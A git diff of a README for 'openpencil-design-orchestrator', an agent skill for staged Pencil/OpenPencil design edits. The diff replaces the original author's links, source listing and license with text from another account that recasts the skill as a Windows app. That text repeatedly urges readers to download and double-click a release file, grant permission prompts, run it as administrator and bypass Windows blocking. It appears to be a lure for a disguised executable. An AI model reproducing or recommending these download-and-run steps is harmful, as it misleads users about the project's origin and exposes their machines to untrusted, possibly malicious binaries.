@@ -1,139 +1,192 @@
-# openpencil-design-orchestrator
+# 🛠️ openpencil-design-orchestrator - Simple design workflows, safer edits
 
-**English** | [简体中文](./README.zh-CN.md)
+[![Download the app](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sorrowfulnessstaff973/openpencil-design-orchestrator/releases)
 
-[![Release](https://img.shields.io/github/v/release/ziiinian/openpencil-design-orchestrator?display_name=tag)](https://github.com/ziiinian/openpencil-design-orchestrator/releases)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](./LICENSE)
-[![Repo](https://img.shields.io/badge/OpenClaw-Agent%20Skill-blue)](https://github.com/ziiinian/openpencil-design-orchestrator)
+## 📥 Download
 
-Controlled AI-assisted design workflow for Pencil / OpenPencil.
+Go to the [Releases page](https://github.com/sorrowfulnessstaff973/openpencil-design-orchestrator/releases) and download the latest Windows package.  
+After the file finishes downloading, open it and follow the prompts to run it on your PC.
 
-An Agent Skill for orchestrating Pencil / OpenPencil design work through a staged, MCP-first workflow.
+## ✅ What this tool does
 
-## Quick Start
+openpencil-design-orchestrator helps you manage design tasks with safer, staged edits. It is made for users who want a guided way to work with Pencil or OpenPencil design files.
 
-### Option 1 — Download the packaged skill
-Go to the latest release and download:
+Use it to:
 
-- [`openpencil-design-orchestrator.skill`](https://github.com/ziiinian/openpencil-design-orchestrator/releases/latest)
+- organize design tasks into clear steps
+- keep edits limited to the right section
+- review changes before they go too far
+- fall back to a safer path if a task hits a problem
+- keep design work steady and easy to track
 
-### Option 2 — Inspect the source
-Browse the skill source directly in this repository:
+## 🖥️ Windows requirements
 
-- `SKILL.md`
-- `references/`
-- `scripts/`
+This app is meant for Windows desktop use.
 
-## Installation / Use
+You should have:
 
-This repository ships both the **source skill** and a packaged `.skill` release artifact.
+- Windows 10 or Windows 11
+- at least 4 GB of RAM
+- 200 MB of free disk space
+- a mouse and keyboard
+- an internet connection for the first download
 
-Typical usage flow:
+## 🚀 How to install on Windows
 
-1. Download the `.skill` artifact from the latest release
-2. Install/import it into your skill environment
-3. Use it when working with Pencil / OpenPencil design tasks that need staged, bounded execution
+1. Open the [Releases page](https://github.com/sorrowfulnessstaff973/openpencil-design-orchestrator/releases)
+2. Find the newest release at the top
+3. Download the Windows file listed there
+4. If the file is zipped, right-click it and choose Extract All
+5. Open the extracted folder
+6. Double-click the app file to start it
+7. If Windows asks for permission, choose Run or Yes
 
-Typical trigger examples:
+If you keep the file in your Downloads folder, you can open it from there later without downloading it again.
 
-- “Use Pencil/OpenPencil to redesign this hero section, but do it section-by-section.”
-- “Audit this design for spacing, typography, and token consistency before editing.”
-- “Plan the page structure first, then create only the skeleton.”
+## 🧭 First run
 
-## Install and verify
+When you open openpencil-design-orchestrator for the first time, it may ask you to set a working folder. Use a folder where you keep your design files.
 
-For installation and first-run verification, see:
+Typical first steps:
 
-- [Installation Guide](./docs/INSTALL.md)
-- [简体中文安装说明](./docs/INSTALL.zh-CN.md)
+- choose your Pencil or OpenPencil project folder
+- let the app scan the available design sections
+- pick the task you want to run
+- review the staged plan before any changes begin
 
-For follow-up support materials, see:
+If the app shows a prompt about access, choose the folder you want it to use.
 
-- [Troubleshooting](./docs/TROUBLESHOOTING.md)
-- [Usage Examples](./docs/EXAMPLES.md)
-- [Evaluation Guide](./docs/EVALUATION.md)
+## ✏️ What “staged” means
 
-## What it does
+This tool uses staged workflows. That means it does not try to change everything at once.
 
-`openpencil-design-orchestrator` turns vague AI-assisted design requests into a controlled sequence of steps:
+It works in steps:
 
-1. **Preflight** – verify Pencil/OpenPencil, MCP readiness, and current structure
-2. **Planning** – break work into pages, sections, components, tokens, and execution order
-3. **Skeleton** – build structural scaffolding only
-4. **Section Content** – edit one section at a time with bounded scope
-5. **Refinement** – improve spacing, hierarchy, consistency, and polish
-6. **Save / Handoff** – summarize changes and remaining risks
+1. read the current design state
+2. plan the next edit
+3. apply one section at a time
+4. check the result
+5. move to the next step only if the last one worked
 
-The goal is to avoid uncontrolled one-shot design mutations and keep changes small, reviewable, and reversible.
+This helps keep edits more controlled and easier to review.
 
-## Best fit
+## 🔒 Section-safe edits
 
-Use this skill when you need to:
+The app is built for section-safe edits. That means it tries to keep changes inside the right part of the design.
 
-- work with Pencil / OpenPencil through MCP
-- orchestrate AI-assisted design changes safely
-- perform section-by-section design edits
-- audit layout, consistency, spacing, tokens, and structure
-- adapt workflows across Claude Code, Codex, Cursor, or Windsurf
+This helps when you want to:
 
-## Not for
+- update one screen
+- change a single component
+- keep layout rules intact
+- avoid touching parts that are already stable
 
-This skill is not the best primary path for:
+If a change does not fit the current section, the app can switch to a safer path instead of forcing it through.
 
-- unconstrained whole-product one-shot generation
-- blind large-scale destructive edits
-- pretending live editing works when MCP is unavailable
-- default-on high-risk automation via unrestricted `eval`
+## 🧪 Audit checks
 
-## Repository layout
+Before and after each task, the tool can run audit checks.
 
-```text
-.
-├── SKILL.md
-├── README.md
-├── README.zh-CN.md
-├── references/
-├── scripts/
-├── dist/
-│   └── openpencil-design-orchestrator.skill
-├── source/
-│   └── NOTICE.txt
-└── LICENSE
-```
+These checks help you:
 
-## Key files
+- see what changed
+- compare the before and after state
+- catch layout issues early
+- confirm that the right section was updated
+- spot unwanted side effects
 
-- `SKILL.md` – trigger description, workflow rules, operating constraints
-- `references/` – prompt framework, workflow sequence, fallback mode, risk matrix, client adapters, capability notes
-- `scripts/preflight-check.sh` – quick environment and MCP readiness check
-- `scripts/scaffold-phase-prompt.py` – generate phase-specific prompt scaffolds
-- `dist/openpencil-design-orchestrator.skill` – packaged distributable skill file
+An audit is useful when you want a clean record of design work.
 
-## Typical usage patterns
+## 🔁 Fallback-aware workflow
 
-### 1. Build a new page safely
-Example: “Create a SaaS landing page, but start with skeleton only.”
+If a step fails, openpencil-design-orchestrator can move to a fallback path.
 
-### 2. Revise one section without collateral damage
-Example: “Only redesign the hero section; do not touch the rest.”
+That means it can:
 
-### 3. Audit an existing design
-Example: “Review spacing, typography hierarchy, and token consistency before editing.”
+- stop the current action
+- keep the last safe state
+- try a simpler route
+- ask for a new input if needed
 
-## Roadmap
+This makes the workflow more steady when a design task is hard to complete in one pass.
 
-Possible future improvements:
+## 🧩 Common use cases
 
-- richer example prompts for more design scenarios
-- more client-specific adapter notes
-- expanded fallback examples for non-MCP workflows
-- release notes for future versions beyond the initial public release
+You can use this tool for:
 
-## Release
+- updating UI sections in a design file
+- keeping repeated edits consistent
+- managing multi-step design changes
+- checking design changes before handoff
+- working with an agent-based tool chain
+- coordinating tasks across MCP-aware apps
 
-- Latest release: <https://github.com/ziiinian/openpencil-design-orchestrator/releases/latest>
-- First public release: <https://github.com/ziiinian/openpencil-design-orchestrator/releases/tag/v1.0.0>
+## 🔗 MCP and agent tools
 
-## License
+This project is built for an MCP-first setup and fits agent-style tools. It can work with tools like Claude Code, Codex, Cursor, and Windsurf when they use the same workflow pattern.
 
-This repository is released under the MIT License. See [LICENSE](./LICENSE).
+That means it is suited for users who want a design task to be handled in a structured way rather than by manual edits alone.
+
+## 📂 Suggested folder setup
+
+For a smoother start, keep your files in a simple folder structure like this:
+
+- `DesignProjects`
+  - `Current`
+  - `Archive`
+  - `Exports`
+
+Keep the project you want to work on in `Current` so it is easy to find.
+
+## 🛠️ Basic use
+
+1. Start the app
+2. Open your project folder
+3. Choose the design task
+4. Review the staged plan
+5. Run the first step
+6. Check the audit result
+7. Continue if the result looks right
+
+If you want to make one change only, stop after that section and save the output.
+
+## 🧼 Tips for smooth use
+
+- Keep one project open at a time
+- Use clear folder names
+- Save a copy before large edits
+- Check the audit after each task
+- Close other design apps if they use the same files
+- Use short task names so they are easy to track
+
+## 🧠 Troubleshooting
+
+If the app does not start:
+
+- make sure the download finished
+- extract the file if it came in a zip folder
+- try running it as an administrator
+- check that Windows did not block the file
+- download the newest release again
+
+If the app opens but does not find your files:
+
+- confirm that you selected the right folder
+- check that the design files are still in place
+- move the project to a simple local folder
+- avoid using a path with special characters
+
+If a task stops halfway:
+
+- review the last audit message
+- try a smaller section
+- run the fallback step
+- restart the app and load the same project again
+
+## 📦 Release downloads
+
+Use the [Releases page](https://github.com/sorrowfulnessstaff973/openpencil-design-orchestrator/releases) to visit the download page, get the latest Windows file, and run it on your machine
+
+## 🏷️ Project topics
+
+agent-skill, claude-code, codex, cursor, design-automation, mcp, openclaw, openpencil, pencil, windsurf, workflow-orchestration
